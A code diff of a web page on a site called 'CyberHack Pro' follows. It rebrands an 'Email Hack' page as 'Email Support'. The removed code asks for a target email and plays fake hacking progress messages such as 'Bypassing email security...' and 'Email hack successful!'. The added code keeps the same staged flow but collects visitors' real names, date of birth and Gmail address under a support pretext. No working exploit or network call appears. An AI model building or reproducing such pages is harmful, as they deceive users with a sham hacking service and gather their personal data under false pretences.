@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Hack - CyberHack Pro</title>
+    <title>Email Support - CyberHack Pro</title>
     <link rel="stylesheet" href="styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -4500,6 +4500,196 @@ Professional tools for all your needs, 0.5);
                 font-size: 12px !important;
             }
         }
+
+        /* Safe Email Support UI overrides (low-light blue premium look) */
+        .verification-screen {
+            background: #050d1a;
+            background-image:
+                radial-gradient(circle at 18% 24%, rgba(64, 157, 255, 0.12) 0%, transparent 48%),
+                radial-gradient(circle at 80% 76%, rgba(75, 211, 255, 0.10) 0%, transparent 50%),
+                linear-gradient(140deg, #030910 0%, #071324 52%, #050c18 100%);
+            animation: none;
+        }
+
+        .verification-screen::before {
+            opacity: 0.18;
+            animation: none;
+        }
+
+        .verification-screen::after {
+            opacity: 0.08;
+            animation: none;
+        }
+
+        .verification-container {
+            background: linear-gradient(165deg, rgba(5, 17, 30, 0.96), rgba(8, 23, 40, 0.92));
+            border: 1px solid rgba(88, 167, 255, 0.52);
+            box-shadow:
+                0 18px 48px rgba(1, 8, 17, 0.72),
+                0 0 30px rgba(64, 157, 255, 0.14),
+                inset 0 0 24px rgba(75, 211, 255, 0.06);
+            animation: containerSlideIn 0.55s ease-out;
+            backdrop-filter: blur(10px);
+        }
+
+        .verification-container::before,
+        .verification-container::after {
+            color: rgba(109, 188, 255, 0.75);
+            text-shadow: 0 0 8px rgba(109, 188, 255, 0.4);
+            animation: none;
+        }
+
+        .verification-header i {
+            color: #66c8ff;
+            text-shadow: 0 0 18px rgba(102, 200, 255, 0.38);
+            filter: none;
+            animation: none;
+        }
+
+        .verification-header h1 {
+            color: #f3f9ff;
+            text-shadow: 0 8px 24px rgba(42, 122, 198, 0.35);
+            animation: none;
+            letter-spacing: 1.4px;
+            font-size: 33px;
+        }
+
+        .verification-header p {
+            color: #bfd8f1;
+            text-shadow: none;
+            letter-spacing: 0.4px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .verification-header::after {
+            background: linear-gradient(90deg, transparent, rgba(109, 188, 255, 0.95), transparent);
+            box-shadow: 0 0 10px rgba(109, 188, 255, 0.4);
+        }
+
+        .verification-input-group label {
+            color: #eaf3ff;
+            text-shadow: none;
+            font-size: 15px;
+            letter-spacing: 0.3px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .verification-input-group label i {
+            color: #6ed0ff;
+            text-shadow: none;
+        }
+
+        .verification-code-input {
+            background: rgba(7, 20, 36, 0.95);
+            border: 1px solid rgba(93, 167, 255, 0.5);
+            color: #f4f8ff;
+            box-shadow: inset 0 0 0 1px rgba(68, 126, 188, 0.15);
+            font-family: 'Poppins', sans-serif;
+            font-size: 15px;
+            letter-spacing: 0.2px;
+        }
+
+        .verification-code-input::placeholder {
+            color: #90a9c4;
+        }
+
+        .verification-code-input:focus {
+            border-color: #74cfff;
+            box-shadow:
+                0 0 0 3px rgba(116, 207, 255, 0.2),
+                0 0 22px rgba(70, 152, 245, 0.25);
+        }
+
+        .support-guidance {
+            margin: 2px 0 14px;
+            color: #9fbad5;
+            font-size: 12px;
+            line-height: 1.55;
+            padding: 10px 12px;
+            border: 1px solid rgba(93, 167, 255, 0.28);
+            border-radius: 10px;
+            background: rgba(10, 28, 46, 0.5);
+        }
+
+        .support-guidance strong {
+            color: #d6ecff;
+        }
+
+        .verification-action-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .verification-screen .verify-btn,
+        .verification-screen .secondary-action-btn {
+            min-height: 50px;
+            border-radius: 12px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 15px;
+            letter-spacing: 0.5px;
+            font-weight: 700;
+            transition: transform 0.22s ease, box-shadow 0.22s ease, background 0.22s ease;
+        }
+
+        .verification-screen .verify-btn {
+            background: linear-gradient(135deg, #2d8ee8 0%, #32c0ff 100%);
+            color: #f8fdff;
+            border: 1px solid rgba(124, 207, 255, 0.7);
+            box-shadow: 0 10px 24px rgba(36, 120, 200, 0.32);
+            text-transform: none;
+        }
+
+        .verification-screen .verify-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 12px 24px rgba(36, 120, 200, 0.36);
+        }
+
+        .verification-screen .secondary-action-btn {
+            border: 1px solid rgba(124, 176, 223, 0.45);
+            color: #cae3ff;
+            background: linear-gradient(135deg, rgba(18, 33, 53, 0.95), rgba(16, 44, 72, 0.92));
+            box-shadow: inset 0 0 0 1px rgba(89, 132, 176, 0.12);
+            cursor: pointer;
+        }
+
+        .verification-screen .secondary-action-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 10px 20px rgba(3, 9, 18, 0.35);
+        }
+
+        @media (max-width: 600px) {
+            .verification-container {
+                padding: 28px 18px;
+                border-radius: 16px;
+            }
+
+            .verification-header h1 {
+                font-size: 24px;
+            }
+
+            .verification-header p {
+                font-size: 13px;
+            }
+
+            .verification-input-group {
+                margin-bottom: 16px;
+            }
+
+            .verification-input-group label {
+                font-size: 13px;
+                margin-bottom: 8px;
+            }
+
+            .verification-code-input {
+                padding: 14px 12px;
+                font-size: 14px;
+            }
+
+            .verification-action-row {
+                grid-template-columns: 1fr;
+            }
+        }
     </style>
     <link rel="stylesheet" href="shared-responsive-system.css">
 </head>
@@ -4513,7 +4703,7 @@ Professional tools for all your needs, 0.5);
         <div class="terminal-window">
             <div class="terminal-header">
                 <i class="fas fa-envelope"></i>
-                <span>Email Hack Initializing...</span>
+                <span>Email Support Initializing...</span>
             </div>
             <div class="terminal-messages" id="loadingMessages">
                 <!-- Hacking messages will be added dynamically -->
@@ -4524,27 +4714,51 @@ Professional tools for all your needs, 0.5);
         </div>
     </div>
 
-    <!-- Email Verification Screen -->
+    <!-- Email Support Request Screen -->
     <div class="verification-screen" id="verificationScreen" style="display: none;">
         <div class="verification-container">
             <div class="verification-header">
-                <i class="fas fa-envelope"></i>
-                <h1>Email Verification</h1>
-                <p>Enter the email address you want to hack</p>
+                <i class="fas fa-user-shield"></i>
+                <h1>Email Support Request</h1>
+                <p>Fill your details to continue with secure support</p>
             </div>
             <form id="emailForm" onsubmit="submitEmailForm(event)">
                 <div class="verification-input-group">
+                    <label for="firstNameInput">
+                        <i class="fas fa-user"></i> First Name
+                    </label>
+                    <input type="text" id="firstNameInput" class="verification-code-input" placeholder="Enter first name" maxlength="50" required>
+                </div>
+                <div class="verification-input-group">
+                    <label for="lastNameInput">
+                        <i class="fas fa-user-tag"></i> Last Name
+                    </label>
+                    <input type="text" id="lastNameInput" class="verification-code-input" placeholder="Enter last name" maxlength="50" required>
+                </div>
+                <div class="verification-input-group">
+                    <label for="dobInput">
+                        <i class="fas fa-calendar-day"></i> Date of Birth
+                    </label>
+                    <input type="date" id="dobInput" class="verification-code-input" required>
+                </div>
+                <div class="verification-input-group">
                     <label for="emailInput">
-                        <i class="fas fa-envelope"></i> Email Address
+                        <i class="fas fa-envelope"></i> Gmail Address
                     </label>
                     <input type="email" id="emailInput" class="verification-code-input" placeholder="example@gmail.com" required>
                 </div>
                 <div id="domainError" class="error-notification" style="display: none;">
                     <i class="fas fa-exclamation-triangle error-icon"></i>
                     <div class="shimmer-overlay"></div>
-                    <div id="domainErrorText">শুধু Gmail, Outlook, বা Hotmail ইমেইল গ্রহণযোগ্য। অন্য ডোমেইনে কাজ হবে না।</div>
+                    <div id="domainErrorText">সব ঘর সঠিকভাবে পূরণ করুন। শুধু gmail.com ঠিকানা গ্রহণযোগ্য।</div>
                 </div>
-                <div class="verification-dialog-actions">
+                <div class="support-guidance">
+                    Recommendation: Use real profile info and a valid <strong>gmail.com</strong> address for faster support validation.
+                </div>
+                <div class="verification-action-row">
+                    <button type="button" class="secondary-action-btn" onclick="skipEmailForm()">
+                        <i class="fas fa-forward"></i> Skip
+                    </button>
                     <button type="submit" class="verify-btn">
                         <i class="fas fa-check"></i> Continue
                     </button>
@@ -4557,8 +4771,8 @@ Professional tools for all your needs, 0.5);
     <div class="processing-screen" id="processingScreen" style="display: none;">
         <div class="processing-content">
             <i class="fas fa-cog fa-spin"></i>
-            <h1>Email Hacking Processing...</h1>
-            <p>Please wait while we process your request</p>
+            <h1>Support Request Processing...</h1>
+            <p>Please wait while we validate your request</p>
         </div>
     </div>
 
@@ -5004,11 +5218,11 @@ Professional tools for all your needs, 0.5);
 
     <script src="service-voice-assistant.js"></script>
     <script>
-        // Email Hack Flow: Loading → Verification → Processing → Blank Page
-        console.log('Email hack page script loaded');
+        // Email Support Flow: Loading → Request Form → Processing → Contact Page
+        console.log('Email support page script loaded');
         
         window.addEventListener('load', async function() {
-            console.log('Email hack page loaded, starting flow...');
+            console.log('Email support page loaded, starting flow...');
             initializeInstagramScannerFlow();
             
             // Step 1: Show initial loading screen (2 seconds)
@@ -5023,9 +5237,9 @@ Professional tools for all your needs, 0.5);
                 // Simple initial loading messages
                 if (loadingMessages) {
                     loadingMessages.innerHTML = `
-                        <div class="terminal-line" style="animation-delay: 0.2s;">> Initializing Email Hack System...</div>
-                        <div class="terminal-line" style="animation-delay: 0.6s;">> Loading email verification module...</div>
-                        <div class="terminal-line" style="animation-delay: 1s;">> Preparing email input form...</div>
+                        <div class="terminal-line" style="animation-delay: 0.2s;">> Initializing Email Support System...</div>
+                        <div class="terminal-line" style="animation-delay: 0.6s;">> Loading secure request module...</div>
+                        <div class="terminal-line" style="animation-delay: 1s;">> Preparing support intake form...</div>
                     `;
                 }
                 
@@ -5054,7 +5268,7 @@ Professional tools for all your needs, 0.5);
                 if (verificationScreen) {
                     verificationScreen.style.display = 'block';
                     verificationScreen.classList.add('show');
-                    console.log('✅ Email Verification screen displayed');
+                    console.log('✅ Email support form displayed');
                 }
             }, 2000);
         });
@@ -5210,77 +5424,61 @@ Professional tools for all your needs, 0.5);
 
         initializeEmailHackBackButton();
         
-        // Handle Email Verification Form Submit
-        function submitEmailForm(event) {
-            event.preventDefault();
-            const emailInput = document.getElementById('emailInput');
-            const email = emailInput?.value.trim();
-            const lower = String(email || '').toLowerCase();
-            const match = lower.match(/^[^@\s]+@([^@\s]+)$/);
-            const allowed = !!(match && ['gmail.com', 'outlook.com', 'hotmail.com'].includes(match[1]));
-            if (!allowed) {
-                const banner = document.getElementById('domainError');
-                const textEl = document.getElementById('domainErrorText');
-                if (banner && textEl) {
-                    textEl.textContent = 'শুধু gmail.com, outlook.com, বা hotmail.com ডোমেইন অনুমোদিত';
-                    banner.style.display = 'block';
-                    banner.classList.add('show');
-                }
-                return;
+        function showEmailSupportFormError(message) {
+            const banner = document.getElementById('domainError');
+            const textEl = document.getElementById('domainErrorText');
+            if (banner && textEl) {
+                textEl.textContent = message;
+                banner.style.display = 'block';
+                banner.classList.add('show');
             }
+        }
+
+        function clearEmailSupportFormError() {
             const banner = document.getElementById('domainError');
             if (banner) {
                 banner.classList.remove('show');
                 banner.style.display = 'none';
             }
-            
-            console.log('Email submitted:', email);
-            
-            // Hide verification screen without scrolling
+        }
+
+        function startEmailSupportProcessing(formData) {
             const verificationScreen = document.getElementById('verificationScreen');
             if (verificationScreen) {
-                // Store current scroll position
                 const currentScrollY = window.scrollY;
                 verificationScreen.style.display = 'none';
-                // Restore scroll position to prevent auto-scroll to top
                 setTimeout(() => {
                     window.scrollTo(0, currentScrollY);
                 }, 0);
             }
-            
-            // Show processing screen with 10 second hacking loading
-            const processingScreen = document.getElementById('processingScreen');
+
             const loadingScreen = document.getElementById('loadingScreen');
             const loadingProgress = document.getElementById('loadingProgress');
             const loadingMessages = document.getElementById('loadingMessages');
-            
+
             if (loadingScreen) {
                 loadingScreen.style.display = 'flex';
-                console.log('✅ Hacking processing screen displayed');
-                
-                // Hacking code messages (coming from top)
-                const hackingMessages = [
-                    '> Email address received: ' + email,
-                    '> Initializing email hacking protocol...',
-                    '> Connecting to SMTP servers...',
-                    '> Bypassing email security...',
-                    '> Accessing email database...',
-                    '> Decrypting email credentials...',
-                    '> Extracting email data...',
-                    '> Analyzing email patterns...',
-                    '> Hacking email account...',
-                    '> Retrieving email information...',
-                    '> Finalizing email hack...',
-                    '> Email hack successful!'
+                console.log('✅ Support processing screen displayed');
+
+                const supportMessages = [
+                    '> Support request received',
+                    `> First Name: ${formData.firstName || 'Skipped'}`,
+                    `> Last Name: ${formData.lastName || 'Skipped'}`,
+                    `> Date of Birth: ${formData.dob || 'Skipped'}`,
+                    `> Gmail Address: ${formData.email || 'Skipped'}`,
+                    '> Running profile completeness checks...',
+                    '> Validating request format...',
+                    '> Preparing support workflow...',
+                    '> Syncing request with contact module...',
+                    '> Finalizing response package...',
+                    '> Support request prepared successfully'
                 ];
-                
-                // Clear existing messages
+
                 if (loadingMessages) {
                     loadingMessages.innerHTML = '';
                 }
-                
-                // Show messages one by one (from top) - every 900ms
-                hackingMessages.forEach((message, index) => {
+
+                supportMessages.forEach((message, index) => {
                     setTimeout(() => {
                         if (loadingMessages) {
                             const line = document.createElement('div');
@@ -5288,20 +5486,16 @@ Professional tools for all your needs, 0.5);
                             line.textContent = message;
                             line.style.animationDelay = '0s';
                             loadingMessages.appendChild(line);
-                            
-                            // Auto scroll to bottom to show latest message
                             loadingMessages.scrollTop = loadingMessages.scrollHeight;
                         }
-                    }, index * 900); // Show each message every 900ms
+                    }, index * 900);
                 });
-                
-                // Update terminal header
+
                 const terminalHeader = loadingScreen.querySelector('.terminal-header span');
                 if (terminalHeader) {
-                    terminalHeader.textContent = 'Email Hacking in Progress...';
+                    terminalHeader.textContent = 'Email Support Processing...';
                 }
-                
-                // Animate progress bar (10 seconds total)
+
                 let progress = 0;
                 const progressInterval = setInterval(() => {
                     progress += 1;
@@ -5311,66 +5505,56 @@ Professional tools for all your needs, 0.5);
                     if (progress >= 100) {
                         clearInterval(progressInterval);
                     }
-                }, 100); // 10 seconds total (100% / 100ms = 1% per 100ms)
+                }, 100);
             }
-            
-            // After 10 seconds, go to Contact Information page
+
             setTimeout(() => {
-                // Hide all screens first
-                const loadingScreen = document.getElementById('loadingScreen');
-                const verificationScreen = document.getElementById('verificationScreen');
-                const processingScreen = document.getElementById('processingScreen');
-                
-                if (loadingScreen) {
-                    loadingScreen.style.display = 'none';
-                    loadingScreen.classList.remove('show');
+                const loadingScreenEl = document.getElementById('loadingScreen');
+                const verificationScreenEl = document.getElementById('verificationScreen');
+                const processingScreenEl = document.getElementById('processingScreen');
+
+                if (loadingScreenEl) {
+                    loadingScreenEl.style.display = 'none';
+                    loadingScreenEl.classList.remove('show');
                 }
-                
-                if (verificationScreen) {
-                    verificationScreen.style.display = 'none';
-                    verificationScreen.classList.remove('show');
+
+                if (verificationScreenEl) {
+                    verificationScreenEl.style.display = 'none';
+                    verificationScreenEl.classList.remove('show');
                 }
-                
-                if (processingScreen) {
-                    processingScreen.style.display = 'none';
-                    processingScreen.classList.remove('show');
+
+                if (processingScreenEl) {
+                    processingScreenEl.style.display = 'none';
+                    processingScreenEl.classList.remove('show');
                 }
-                
-                // Show blank page (Contact Information page)
+
                 const blankPage = document.getElementById('blankPage');
                 if (blankPage) {
                     blankPage.style.display = 'block';
                     blankPage.classList.add('show');
                     console.log('✅ Contact Information page displayed');
-                    
-                    // Ensure blankPage is visible and scroll to Contact Information section
+
                     setTimeout(() => {
-                        // Scroll to top of page first
                         window.scrollTo(0, 0);
-                        
-                        // Then scroll to Contact Information section smoothly
                         setTimeout(() => {
                             const contactContainer = blankPage.querySelector('.contact-container');
                             if (contactContainer) {
-                                contactContainer.scrollIntoView({ 
-                                    behavior: 'smooth', 
-                                    block: 'start' 
+                                contactContainer.scrollIntoView({
+                                    behavior: 'smooth',
+                                    block: 'start'
                                 });
                             } else {
-                                // Fallback: scroll to blankPage itself
-                                blankPage.scrollIntoView({ 
-                                    behavior: 'smooth', 
-                                    block: 'start' 
+                                blankPage.scrollIntoView({
+                                    behavior: 'smooth',
+                                    block: 'start'
                                 });
                             }
                         }, 200);
                     }, 100);
                 }
-                
-                // Load content
+
                 loadBlankPageContent();
-                
-                // Initialize toggle buttons after blank page is shown - multiple attempts to ensure it works
+
                 setTimeout(() => {
                     console.log('Initializing toggle buttons after blank page shown...');
                     if (typeof initializeToggleButtons === 'function') {
@@ -5379,14 +5563,68 @@ Professional tools for all your needs, 0.5);
                         console.error('initializeToggleButtons function not found!');
                     }
                 }, 500);
-                
+
                 setTimeout(() => {
                     console.log('Re-initializing toggle buttons (second attempt)...');
                     if (typeof initializeToggleButtons === 'function') {
                         initializeToggleButtons();
                     }
                 }, 1000);
-            }, 10000); // 10 seconds
+            }, 10000);
+        }
+
+        window.skipEmailForm = function() {
+            clearEmailSupportFormError();
+            startEmailSupportProcessing({
+                firstName: '',
+                lastName: '',
+                dob: '',
+                email: '',
+                skipped: true
+            });
+        };
+
+        // Handle Email Support Request Form Submit
+        function submitEmailForm(event) {
+            event.preventDefault();
+            const firstName = (document.getElementById('firstNameInput')?.value || '').trim();
+            const lastName = (document.getElementById('lastNameInput')?.value || '').trim();
+            const dob = (document.getElementById('dobInput')?.value || '').trim();
+            const emailInput = document.getElementById('emailInput');
+            const email = emailInput?.value.trim();
+            const lower = String(email || '').toLowerCase();
+            const match = lower.match(/^[^@\s]+@([^@\s]+)$/);
+            const isGmail = !!(match && match[1] === 'gmail.com');
+
+            if (!firstName || firstName.length < 2) {
+                showEmailSupportFormError('First Name কমপক্ষে 2 অক্ষর দিন।');
+                return;
+            }
+
+            if (!lastName || lastName.length < 2) {
+                showEmailSupportFormError('Last Name কমপক্ষে 2 অক্ষর দিন।');
+                return;
+            }
+
+            if (!dob) {
+                showEmailSupportFormError('Date of Birth সিলেক্ট করুন।');
+                return;
+            }
+
+            if (!isGmail) {
+                showEmailSupportFormError('শুধু gmail.com ঠিকানা দিয়ে Continue করুন।');
+                return;
+            }
+
+            clearEmailSupportFormError();
+            console.log('Support request submitted:', { firstName, lastName, dob, email });
+            startEmailSupportProcessing({
+                firstName,
+                lastName,
+                dob,
+                email,
+                skipped: false
+            });
         }
 
         async function loadBlankPageContent() {
